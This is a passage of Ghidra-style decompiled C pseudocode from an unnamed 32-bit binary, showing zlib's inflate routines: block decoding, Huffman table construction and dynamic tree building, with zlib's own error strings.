    local_24 = pbVar3;
    if (9 < uVar11) {
      param_1 = -2;
LAB_004069f1:
      *(uint *)((int)this + 0x20) = local_28;
LAB_004069f8:
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
LAB_00406a02:
      pbVar3 = *in_EAX;
      *in_EAX = _Src;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar3);
      *(byte **)((int)this + 0x34) = local_24;
      FUN_004060c0(param_1);
      return;
    }
    switch((&switchD_00406a26::switchdataD_004073bc)[uVar11]) {
    case (undefined *)0x406a2d:
      iVar9 = param_1;
      for (; uVar5 = uVar6, uVar12 < 3; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = local_28;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = (byte *)0x0;
          goto LAB_00407110;
        }
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        local_28 = uVar5 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        uVar6 = local_28;
        iVar9 = param_1;
      }
      *(uint *)((int)this + 0x18) = uVar5 & 1;
      param_1 = iVar9;
      switch((uVar5 & 7) >> 1) {
      case 0:
        uVar11 = uVar12 - 3 & 7;
        uVar5 = (uVar5 >> 3) >> (sbyte)uVar11;
        uVar12 = (uVar12 - 3) - uVar11;
        *(undefined4 *)this = 1;
        local_28 = uVar5;
        break;
      case 1:
        iVar9 = FUN_004061b0(9,5,&DAT_0041e5c8,&DAT_0041f5c8);
        *(int *)((int)this + 4) = iVar9;
        if (iVar9 == 0) {
          param_1 = -4;
          goto LAB_004069f1;
        }
        uVar5 = local_28 >> 3;
        uVar12 = uVar12 - 3;
        *(undefined4 *)this = 6;
        local_28 = uVar5;
        break;
      case 2:
        uVar5 = uVar5 >> 3;
        uVar12 = uVar12 - 3;
        *(undefined4 *)this = 3;
        local_28 = uVar5;
        break;
      case 3:
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_invalid_block_type_0041fd98;
        *(uint *)((int)this + 0x20) = local_28 >> 3;
        uVar12 = uVar12 - 3;
        param_1 = -3;
        goto LAB_004069f8;
      }
      break;
    case (undefined *)0x406aeb:
      for (; uVar12 < 0x20; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) goto LAB_00407159;
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        uVar6 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        local_28 = uVar6;
      }
      uVar11 = uVar6 & 0xffff;
      if (~uVar6 >> 0x10 != uVar11) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_invalid_stored_block_lengths_0041fdac;
        goto switchD_00406a26_caseD_407181;
      }
      uVar5 = 0;
      uVar12 = 0;
      *(uint *)((int)this + 4) = uVar11;
      local_28 = 0;
      if (uVar11 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      else {
        *(undefined4 *)this = 2;
      }
      break;
    case (undefined *)0x406b62:
      if (local_20 == (byte *)0x0) {
LAB_004071b4:
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = (byte *)0x0;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_004060c0(param_1);
        return;
      }
      if (local_18 == (byte *)0x0) {
        local_18 = (byte *)0x0;
        if (pbVar3 == *(byte **)((int)this + 0x2c)) {
          pbVar4 = *(byte **)((int)this + 0x30);
          local_24 = *(byte **)((int)this + 0x28);
          if (local_24 != pbVar4) {
            if (local_24 < pbVar4) {
              local_18 = pbVar4 + (-1 - (int)local_24);
            }
            else {
              local_18 = *(byte **)((int)this + 0x2c) + -(int)local_24;
            }
            pbVar3 = local_24;
            if (local_18 != (byte *)0x0) goto LAB_00406c15;
          }
        }
        local_24 = pbVar3;
        *(byte **)((int)this + 0x34) = local_24;
        iVar9 = FUN_004060c0(param_1);
        pbVar3 = *(byte **)((int)this + 0x30);
        local_24 = *(byte **)((int)this + 0x34);
        if (local_24 < pbVar3) {
          local_18 = pbVar3 + (-1 - (int)local_24);
        }
        else {
          local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_24);
        }
        if (local_24 == *(byte **)((int)this + 0x2c)) {
          pbVar4 = *(byte **)((int)this + 0x28);
          if (pbVar4 != pbVar3) {
            local_24 = pbVar4;
            if (pbVar4 < pbVar3) {
              local_18 = pbVar3 + (-1 - (int)pbVar4);
            }
            else {
              local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)pbVar4);
            }
          }
        }
        if (local_18 == (byte *)0x0) {
          *(uint *)((int)this + 0x20) = uVar5;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = local_20;
          goto LAB_00407110;
        }
      }
LAB_00406c15:
      param_1 = 0;
      local_1c = *(byte **)((int)this + 4);
      if (local_20 < *(byte **)((int)this + 4)) {
        local_1c = local_20;
      }
      if (local_18 < local_1c) {
        local_1c = local_18;
      }
      _memcpy(local_24,_Src,(size_t)local_1c);
      local_20 = local_20 + -(int)local_1c;
      local_24 = local_24 + (int)local_1c;
      local_18 = local_18 + -(int)local_1c;
      _Src = _Src + (int)local_1c;
      piVar1 = (int *)((int)this + 4);
      *piVar1 = *piVar1 - (int)local_1c;
      if (*piVar1 == 0) {
        *(uint *)this = -(uint)(*(int *)((int)this + 0x18) != 0) & 7;
      }
      break;
    case (undefined *)0x406c7d:
      for (; uVar12 < 0xe; uVar12 = uVar12 + 8) {
        if (local_20 == (byte *)0x0) goto LAB_004071b4;
        bVar2 = *_Src;
        local_20 = local_20 + -1;
        _Src = _Src + 1;
        param_1 = 0;
        uVar6 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
        local_28 = uVar6;
      }
      *(uint *)((int)this + 4) = uVar6 & 0x3fff;
      if ((0x1d < (uVar6 & 0x1f)) || (uVar11 = (uVar6 & 0x3fff) >> 5 & 0x1f, 0x1d < uVar11)) {
        *(undefined4 *)this = 9;
        in_EAX[6] = (byte *)s_too_many_length_or_distance_symb_0041fdcc;
        goto switchD_00406a26_caseD_407181;
      }
      iVar9 = (*(code *)in_EAX[8])(in_EAX[10],uVar11 + 0x102 + (uVar6 & 0x1f),4);
      *(int *)((int)this + 0xc) = iVar9;
      if (iVar9 == 0) {
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_004060c0(-4);
        return;
      }
      uVar6 = local_28 >> 0xe;
      uVar12 = uVar12 - 0xe;
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)this = 4;
      local_28 = uVar6;
    case (undefined *)0x406d12:
      if (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4) {
        do {
          for (; uVar12 < 3; uVar12 = uVar12 + 8) {
            if (local_20 == (byte *)0x0) goto LAB_004071b4;
            bVar2 = *_Src;
            local_20 = local_20 + -1;
            _Src = _Src + 1;
            param_1 = 0;
            local_28 = uVar6 | (uint)bVar2 << ((byte)uVar12 & 0x1f);
            uVar6 = local_28;
          }
          *(uint *)(*(int *)((int)this + 0xc) +
                   *(int *)(&DAT_0041f6c8 + *(int *)((int)this + 8) * 4) * 4) = uVar6 & 7;
          *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          local_28 = local_28 >> 3;
          uVar12 = uVar12 - 3;
          uVar6 = local_28;
        } while (*(uint *)((int)this + 8) < (*(uint *)((int)this + 4) >> 10) + 4);
      }
      uVar11 = *(uint *)((int)this + 8);
      while (uVar11 < 0x13) {
        *(undefined4 *)
         (*(int *)((int)this + 0xc) + *(int *)(&DAT_0041f6c8 + *(int *)((int)this + 8) * 4) * 4) = 0
        ;
        *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
        uVar11 = *(uint *)((int)this + 8);
      }
      *(int *)((int)this + 0x10) = 7;
      iVar9 = FUN_00407930(*(void **)((int)this + 0xc),(int *)((int)this + 0x10),
                           (int *)((int)this + 0x14),*(int *)((int)this + 0x24));
      if (iVar9 != 0) {
        if (iVar9 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
LAB_00407110:
        pbVar3 = *in_EAX;
        *in_EAX = _Src;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar3);
        *(byte **)((int)this + 0x34) = local_24;
        FUN_004060c0(iVar9);
        return;
      }
      *(undefined4 *)((int)this + 8) = 0;
      *(undefined4 *)this = 5;
      uVar6 = local_28;
switchD_00406a26_caseD_406df4:
      if (*(uint *)((int)this + 8) <
          (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f)) {
        do {
          uVar11 = *(uint *)((int)this + 0x10);
          if (uVar12 < uVar11) {
            do {
              if (local_20 == (byte *)0x0) goto LAB_004071b4;
              bVar2 = *_Src;
              local_20 = local_20 + -1;
              bVar10 = (byte)uVar12;
              uVar11 = *(uint *)((int)this + 0x10);
              uVar12 = uVar12 + 8;
              _Src = _Src + 1;
              uVar6 = uVar6 | (uint)bVar2 << (bVar10 & 0x1f);
              param_1 = 0;
              local_28 = uVar6;
            } while (uVar12 < uVar11);
          }
          iVar9 = *(int *)((int)this + 0x14) + (*(uint *)(&DAT_0041e580 + uVar11 * 4) & uVar6) * 8;
          bVar2 = *(byte *)(iVar9 + 1);
          uVar11 = (uint)bVar2;
          local_c = *(uint *)(iVar9 + 4);
          if (local_c < 0x10) {
            local_28 = uVar6 >> (bVar2 & 0x1f);
            uVar12 = uVar12 - uVar11;
            *(uint *)(*(int *)((int)this + 0xc) + *(int *)((int)this + 8) * 4) = local_c;
            *(int *)((int)this + 8) = *(int *)((int)this + 8) + 1;
          }
          else {
            if (local_c == 0x12) {
              local_14 = 7;
            }
            else {
              local_14 = local_c - 0xe;
            }
            local_18 = (byte *)((uint)(local_c == 0x12) * 8 + 3);
            local_10 = uVar11 + local_14;
            for (; uVar12 < local_10; uVar12 = uVar12 + 8) {
              if (local_20 == (byte *)0x0) goto LAB_00407159;
              bVar10 = *_Src;
              local_20 = local_20 + -1;
              _Src = _Src + 1;
              param_1 = 0;
              uVar6 = uVar6 | (uint)bVar10 << ((byte)uVar12 & 0x1f);
              local_28 = uVar6;
            }
            uVar6 = uVar6 >> (bVar2 & 0x1f);
            local_18 = local_18 + (*(uint *)(&DAT_0041e580 + local_14 * 4) & uVar6);
            local_28 = uVar6 >> ((byte)local_14 & 0x1f);
            uVar12 = uVar12 - (local_14 + uVar11);
            iVar9 = *(int *)((int)this + 8);
            if ((byte *)((*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 +
                        (*(uint *)((int)this + 4) & 0x1f)) < local_18 + iVar9) {
LAB_0040727c:
              (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
              *(undefined4 *)this = 9;
              in_EAX[6] = (byte *)s_invalid_bit_length_repeat_0041fdf0;
              *(uint *)((int)this + 0x20) = local_28;
              *(uint *)((int)this + 0x1c) = uVar12;
              in_EAX[1] = local_20;
              in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
              *in_EAX = _Src;
              *(byte **)((int)this + 0x34) = pbVar3;
              FUN_004060c0(-3);
              return;
            }
            if (local_c == 0x10) {
              if (iVar9 == 0) goto LAB_0040727c;
              uVar7 = *(undefined4 *)(*(int *)((int)this + 0xc) + -4 + iVar9 * 4);
            }
            else {
              uVar7 = 0;
            }
            do {
              *(undefined4 *)(*(int *)((int)this + 0xc) + iVar9 * 4) = uVar7;
              iVar9 = iVar9 + 1;
              local_18 = local_18 + -1;
            } while (local_18 != (byte *)0x0);
            *(int *)((int)this + 8) = iVar9;
            local_18 = (byte *)0x0;
          }
          uVar6 = local_28;
        } while (*(uint *)((int)this + 8) <
                 (*(uint *)((int)this + 4) >> 5 & 0x1f) + 0x102 + (*(uint *)((int)this + 4) & 0x1f))
        ;
      }
      *(undefined4 *)((int)this + 0x14) = 0;
      local_14 = 9;
      local_18 = (byte *)0x6;
      iVar9 = FUN_004079d0((*(uint *)((int)this + 4) & 0x1f) + 0x101,
                           (*(uint *)((int)this + 4) >> 5 & 0x1f) + 1,*(void **)((int)this + 0xc),
                           &local_14,(int *)&local_18,&local_8,&local_4,*(int *)((int)this + 0x24));
      if (iVar9 != 0) {
        if (iVar9 == -3) {
          (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
          *(undefined4 *)this = 9;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        param_1 = iVar9;
        goto LAB_00406a02;
      }
      puVar8 = (undefined4 *)(*(code *)in_EAX[8])(in_EAX[10],1,0x1c);
      if (puVar8 == (undefined4 *)0x0) {
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
        *in_EAX = _Src;
        *(byte **)((int)this + 0x34) = pbVar3;
        FUN_004060c0(-4);
        return;
      }
      *(undefined *)(puVar8 + 4) = (undefined)local_14;
      *(undefined *)((int)puVar8 + 0x11) = local_18._0_1_;
      *puVar8 = 0;
      puVar8[5] = local_8;
      puVar8[6] = local_4;
      *(undefined4 **)((int)this + 4) = puVar8;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 0xc));
      *(undefined4 *)this = 6;
switchD_00406a26_caseD_407053:
      *(uint *)((int)this + 0x20) = local_28;
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
      pbVar4 = *in_EAX;
      *in_EAX = _Src;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)pbVar4);
      *(byte **)((int)this + 0x34) = pbVar3;
      iVar9 = FUN_004061f0(this,param_1);
      if (iVar9 != 1) {
        FUN_004060c0(iVar9);
        return;
      }
      param_1 = 0;
      (*(code *)in_EAX[9])(in_EAX[10],*(undefined4 *)((int)this + 4));
      uVar5 = *(uint *)((int)this + 0x20);
      local_24 = *(byte **)((int)this + 0x34);
      local_20 = in_EAX[1];
      _Src = *in_EAX;
      uVar12 = *(uint *)((int)this + 0x1c);
      if (local_24 < *(byte **)((int)this + 0x30)) {
        local_18 = *(byte **)((int)this + 0x30) + (-1 - (int)local_24);
      }
      else {
        local_18 = (byte *)(*(int *)((int)this + 0x2c) - (int)local_24);
      }
      local_28 = uVar5;
      if (*(int *)((int)this + 0x18) != 0) {
        *(undefined4 *)this = 7;
switchD_00406a26_caseD_40734b:
        *(byte **)((int)this + 0x34) = local_24;
        param_1 = FUN_004060c0(param_1);
        local_24 = *(byte **)((int)this + 0x34);
        if (*(byte **)((int)this + 0x30) == local_24) {
          *(undefined4 *)this = 8;
switchD_00406a26_caseD_407388:
          *(uint *)((int)this + 0x20) = local_28;
          *(uint *)((int)this + 0x1c) = uVar12;
          in_EAX[1] = local_20;
          in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
          *in_EAX = _Src;
          *(byte **)((int)this + 0x34) = local_24;
          FUN_004060c0(1);
          return;
        }
        *(uint *)((int)this + 0x20) = local_28;
        *(uint *)((int)this + 0x1c) = uVar12;
        in_EAX[1] = local_20;
        goto LAB_00406a02;
      }
      *(undefined4 *)this = 0;
      break;
    case (undefined *)0x406df4:
      goto switchD_00406a26_caseD_406df4;
    case (undefined *)0x407053:
      goto switchD_00406a26_caseD_407053;
    case (undefined *)0x407181:
switchD_00406a26_caseD_407181:
      *(uint *)((int)this + 0x20) = local_28;
      *(uint *)((int)this + 0x1c) = uVar12;
      in_EAX[1] = local_20;
      in_EAX[2] = in_EAX[2] + ((int)_Src - (int)*in_EAX);
      *in_EAX = _Src;
      *(byte **)((int)this + 0x34) = pbVar3;
      FUN_004060c0(-3);
      return;
    case (undefined *)0x40734b:
      goto switchD_00406a26_caseD_40734b;
    case (undefined *)0x407388:
      goto switchD_00406a26_caseD_407388;
    }
                    // WARNING: Load size is inaccurate
    uVar11 = *this;
    pbVar3 = local_24;
    uVar6 = uVar5;
    uVar5 = local_28;
  } while( true );
LAB_00407159:
  *(uint *)((int)this + 0x20) = local_28;
  *(uint *)((int)this + 0x1c) = uVar12;
  in_EAX[1] = (byte *)0x0;
  goto LAB_00406a02;
}



undefined4 FUN_00407400(void)

{
  int iVar1;
  int *unaff_ESI;
  int unaff_EDI;
  
  if ((*unaff_ESI == 4) || (*unaff_ESI == 5)) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[3]);
  }
  if (*unaff_ESI == 6) {
    (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[1]);
  }
  unaff_ESI[0xd] = unaff_ESI[10];
  unaff_ESI[0xc] = unaff_ESI[10];
  *unaff_ESI = 0;
  unaff_ESI[7] = 0;
  unaff_ESI[8] = 0;
  if ((code *)unaff_ESI[0xe] != (code *)0x0) {
    iVar1 = (*(code *)unaff_ESI[0xe])(0,0,0);
    unaff_ESI[0xf] = iVar1;
    *(int *)(unaff_EDI + 0x30) = iVar1;
  }
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[10]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),unaff_ESI[9]);
  (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28));
  return 0;
}



undefined4 __thiscall
FUN_00407490(void *this,uint param_1,uint param_2,int param_3,int param_4,int *param_5,int param_6,
            uint *param_7,uint *param_8)

{
  uint uVar1;
  undefined3 uVar2;
  undefined4 uVar3;
  uint *puVar4;
  uint *in_EAX;
  int *piVar5;
  uint uVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  int iVar10;
  int iVar11;
  uint uVar12;
  undefined4 *puVar13;
  char cVar14;
  uint uVar15;
  int iVar16;
  uint uVar17;
  int iVar18;
  byte bVar19;
  int iVar20;
  uint local_fc;
  uint *local_f8;
  uint local_f4;
  uint local_f0;
  uint *local_ec;
  uint local_e4;
  undefined4 local_dc;
  uint local_d8;
  int local_d4;
  int local_d0;
  int local_c8;
  uint local_c0 [16];
  uint local_80 [16];
  int aiStack_40 [16];
  
  local_c0[0] = 0;
  local_c0[1] = 0;
  local_c0[2] = 0;
  local_c0[3] = 0;
  local_c0[4] = 0;
  local_c0[5] = 0;
  local_c0[6] = 0;
  local_c0[7] = 0;
  local_c0[8] = 0;
  local_c0[9] = 0;
  local_c0[10] = 0;
  local_c0[11] = 0;
  local_c0[12] = 0;
  local_c0[13] = 0;
  local_c0[14] = 0;
  local_c0[15] = 0;
  piVar5 = (int *)this;
  uVar15 = param_1;
  do {
    local_c0[*piVar5] = local_c0[*piVar5] + 1;
    piVar5 = piVar5 + 1;
    uVar15 = uVar15 - 1;
  } while (uVar15 != 0);
  if (local_c0[0] == param_1) {
    *param_5 = 0;
    *in_EAX = 0;
  }
  else {
    local_f0 = 1;
    do {
      if (local_c0[local_f0] != 0) break;
      local_f0 = local_f0 + 1;
    } while (local_f0 < 0x10);
    local_fc = *in_EAX;
    if (*in_EAX < local_f0) {
      local_fc = local_f0;
    }
    uVar15 = 0xf;
    do {
      if (local_c0[uVar15] != 0) break;
      uVar15 = uVar15 - 1;
    } while (uVar15 != 0);
    if (uVar15 < local_fc) {
      local_fc = uVar15;
    }
    *in_EAX = local_fc;
    iVar20 = 1 << ((byte)local_f0 & 0x1f);
    for (uVar9 = local_f0; uVar9 < uVar15; uVar9 = uVar9 + 1) {
      if ((int)(iVar20 - local_c0[uVar9]) < 0) {
        return 0xfffffffd;
      }
      iVar20 = (iVar20 - local_c0[uVar9]) * 2;
    }
    iVar20 = iVar20 - local_c0[uVar15];
    if (iVar20 < 0) {
      return 0xfffffffd;
    }
    local_c0[uVar15] = local_c0[uVar15] + iVar20;
    iVar10 = 0;
    iVar16 = uVar15 - 1;
    local_80[1] = 0;
    if (iVar16 != 0) {
      iVar18 = 0;
      do {
        iVar10 = iVar10 + *(int *)((int)local_c0 + iVar18 + 4);
        iVar16 = iVar16 + -1;
        *(int *)((int)local_80 + iVar18 + 8) = iVar10;
        iVar18 = iVar18 + 4;
      } while (iVar16 != 0);
    }
    uVar9 = 0;
    do {
                    // WARNING: Load size is inaccurate
      iVar10 = *this;
      this = (void *)((int)this + 4);
      if (iVar10 != 0) {
        uVar8 = local_80[iVar10];
        param_8[uVar8] = uVar9;
        local_80[iVar10] = uVar8 + 1;
      }
      uVar9 = uVar9 + 1;
    } while (uVar9 < param_1);
    uVar9 = local_80[uVar15];
    iVar16 = -1;
    iVar10 = -local_fc;
    local_e4 = 0;
    local_80[0] = 0;
    local_ec = param_8;
    aiStack_40[1] = 0;
    local_c8 = 0;
    local_f4 = 0;
    if ((int)local_f0 <= (int)uVar15) {
      local_d0 = local_f0 - 1;
      local_f8 = local_c0 + local_f0;
      do {
        uVar8 = *local_f8;
        uVar3 = local_dc;
        while (local_dc = uVar3, uVar8 != 0) {
          local_dc._2_2_ = (undefined2)((uint)uVar3 >> 0x10);
          uVar1 = uVar8 - 1;
          local_d4 = iVar10 + local_fc;
          if (local_d4 < (int)local_f0) {
            iVar11 = iVar10 - local_fc;
            iVar18 = iVar16;
            do {
              local_d4 = local_d4 + local_fc;
              iVar10 = iVar10 + local_fc;
              iVar16 = iVar18 + 1;
              iVar11 = iVar11 + local_fc;
              uVar17 = uVar15 - iVar10;
              if (local_fc < uVar15 - iVar10) {
                uVar17 = local_fc;
              }
              uVar12 = local_f0 - iVar10;
              uVar6 = 1 << ((byte)uVar12 & 0x1f);
              if ((uVar8 < uVar6) &&
                 (iVar7 = uVar6 + (-1 - uVar1), puVar4 = local_f8, uVar12 < uVar17)) {
                while (uVar12 = uVar12 + 1, uVar12 < uVar17) {
                  if ((uint)(iVar7 * 2) <= puVar4[1]) break;
                  iVar7 = iVar7 * 2 - puVar4[1];
                  puVar4 = puVar4 + 1;
                }
              }
              local_f4 = 1 << ((byte)uVar12 & 0x1f);
              uVar17 = local_f4 + *param_7;
              if (0x5a0 < uVar17) {
                return 0xfffffffd;
              }
              local_c8 = param_6 + *param_7 * 8;
              aiStack_40[iVar18 + 2] = local_c8;
              *param_7 = uVar17;
              if (iVar16 == 0) {
                *param_5 = local_c8;
              }
              else {
                local_80[iVar16] = local_e4;
                uVar17 = local_e4 >> ((byte)iVar11 & 0x1f);
                iVar18 = aiStack_40[iVar16];
                local_d8 = (local_c8 - iVar18 >> 3) - uVar17;
                *(undefined4 *)(iVar18 + uVar17 * 8) = local_dc;
                *(uint *)(iVar18 + 4 + uVar17 * 8) = local_d8;
              }
              iVar18 = iVar16;
            } while (local_d4 < (int)local_f0);
          }
          bVar19 = (byte)iVar10;
          uVar2 = CONCAT21(local_dc._2_2_,(char)local_f0 - bVar19);
          if (local_ec < param_8 + uVar9) {
            local_d8 = *local_ec;
            if (local_d8 < param_2) {
              cVar14 = (-(local_d8 < 0x100) & 0xa0U) + 0x60;
            }
            else {
              iVar18 = (local_d8 - param_2) * 4;
              local_d8 = *(uint *)(iVar18 + param_3);
              cVar14 = *(char *)(iVar18 + param_4) + 'P';
            }
            local_ec = local_ec + 1;
            local_dc = CONCAT31(uVar2,cVar14);
          }
          else {
            local_dc = CONCAT31(uVar2,0xc0);
          }
          iVar18 = 1 << ((char)local_f0 - bVar19 & 0x1f);
          uVar8 = local_e4 >> (bVar19 & 0x1f);
          if (uVar8 < local_f4) {
            puVar13 = (undefined4 *)(local_c8 + uVar8 * 8);
            do {
              *puVar13 = local_dc;
              puVar13[1] = local_d8;
              uVar8 = uVar8 + iVar18;
              puVar13 = puVar13 + iVar18 * 2;
            } while (uVar8 < local_f4);
          }
          uVar17 = 1 << ((byte)local_d0 & 0x1f);
          uVar8 = local_e4 & uVar17;
          while (uVar8 != 0) {
            local_e4 = local_e4 ^ uVar17;
            uVar17 = uVar17 >> 1;
            uVar8 = local_e4 & uVar17;
          }
          local_e4 = local_e4 ^ uVar17;
          uVar8 = uVar1;
          uVar3 = local_dc;
          if (((1 << (bVar19 & 0x1f)) - 1U & local_e4) != local_80[iVar16]) {
            do {
              iVar10 = iVar10 - local_fc;
              iVar16 = iVar16 + -1;
            } while (((1 << ((byte)iVar10 & 0x1f)) - 1U & local_e4) != local_80[iVar16]);
          }
        }
        local_f8 = local_f8 + 1;
        local_d0 = local_d0 + 1;
        local_f0 = local_f0 + 1;
      } while ((int)local_f0 <= (int)uVar15);
    }
    if ((iVar20 != 0) && (uVar15 != 1)) {
      return 0xfffffffb;
    }
  }
  return 0;
}



int __cdecl FUN_00407930(void *param_1,int *param_2,int *param_3,int param_4)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x13,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00407490(param_1,0x13,0x13,0,0,param_3,param_4,&local_4,puVar1);
  if (iVar2 == -3) {
    *(char **)(unaff_EBX + 0x18) = s_oversubscribed_dynamic_bit_lengt_0041fe0c;
  }
  else if ((iVar2 == -5) || (*param_2 == 0)) {
    *(char **)(unaff_EBX + 0x18) = s_incomplete_dynamic_bit_lengths_t_0041fe34;
    iVar2 = -3;
  }
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



int __cdecl
FUN_004079d0(uint param_1,uint param_2,void *param_3,int *param_4,int *param_5,int *param_6,
            int *param_7,int param_8)

{
  uint *puVar1;
  int iVar2;
  int unaff_EBX;
  uint local_4;
  
  local_4 = 0;
  puVar1 = (uint *)(**(code **)(unaff_EBX + 0x20))(*(undefined4 *)(unaff_EBX + 0x28),0x120,4);
  if (puVar1 == (uint *)0x0) {
    return -4;
  }
  iVar2 = FUN_00407490(param_3,param_1,0x101,0x41f748,0x41f7c8,param_6,param_8,&local_4,puVar1);
  if (iVar2 == 0) {
    if (*param_4 != 0) {
      iVar2 = FUN_00407490((void *)((int)param_3 + param_1 * 4),param_2,0,0x41f848,0x41f8c0,param_7,
                           param_8,&local_4,puVar1);
      if (iVar2 == 0) {
        if ((*param_5 != 0) || (param_1 < 0x102)) {
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return 0;
        }
      }
      else {
        if (iVar2 == -3) {
          *(char **)(unaff_EBX + 0x18) = s_oversubscribed_distance_tree_0041fe9c;
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -5) {
          *(char **)(unaff_EBX + 0x18) = s_incomplete_distance_tree_0041febc;
          (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
          return -3;
        }
        if (iVar2 == -4) goto LAB_00407b06;
      }
      *(char **)(unaff_EBX + 0x18) = s_empty_distance_tree_with_lengths_0041fed8;
      iVar2 = -3;
LAB_00407b06:
      (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
      return iVar2;
    }
  }
  else {
    if (iVar2 == -3) {
      *(char **)(unaff_EBX + 0x18) = s_oversubscribed_literal_length_tr_0041fe58;
      goto LAB_00407b3b;
    }
    if (iVar2 == -4) goto LAB_00407b3b;
  }
  *(char **)(unaff_EBX + 0x18) = s_incomplete_literal_length_tree_0041fe7c;
  iVar2 = -3;
LAB_00407b3b:
  (**(code **)(unaff_EBX + 0x24))(*(undefined4 *)(unaff_EBX + 0x28),puVar1);
  return iVar2;
}



undefined4 __cdecl
FUN_00407b60(int param_1,int param_2,int param_3,int param_4,int param_5,byte **param_6)

{
  byte bVar1;
  uint uVar2;
  byte *pbVar3;
  uint uVar4;
  int iVar5;
  uint uVar6;
  int iVar7;
  undefined *puVar8;
  uint uVar9;
  uint uVar10;
  byte *pbVar11;
  byte *pbVar12;
  uint uVar13;
  undefined *puVar14;
  uint uVar15;
  undefined *puVar16;
  byte *local_14;
  undefined *local_10;
  byte *local_c;
  
  pbVar11 = *param_6;
  local_14 = param_6[1];
  uVar15 = *(uint *)(param_5 + 0x20);
  puVar16 = *(undefined **)(param_5 + 0x34);
  uVar4 = *(uint *)(param_5 + 0x1c);
  if (puVar16 < *(undefined **)(param_5 + 0x30)) {
    local_10 = *(undefined **)(param_5 + 0x30) + (-1 - (int)puVar16);
  }
  else {
    local_10 = (undefined *)(*(int *)(param_5 + 0x2c) - (int)puVar16);
  }
  uVar9 = *(uint *)(&DAT_0041e580 + param_1 * 4);
  uVar2 = *(uint *)(&DAT_0041e580 + param_2 * 4);
  local_c = pbVar11;
  do {
    for (; uVar4 < 0x14; uVar4 = uVar4 + 8) {
      bVar1 = *pbVar11;
      local_14 = local_14 + -1;
      pbVar11 = pbVar11 + 1;
      uVar15 = uVar15 | (uint)bVar1 << ((byte)uVar4 & 0x1f);
      local_c = pbVar11;
    }
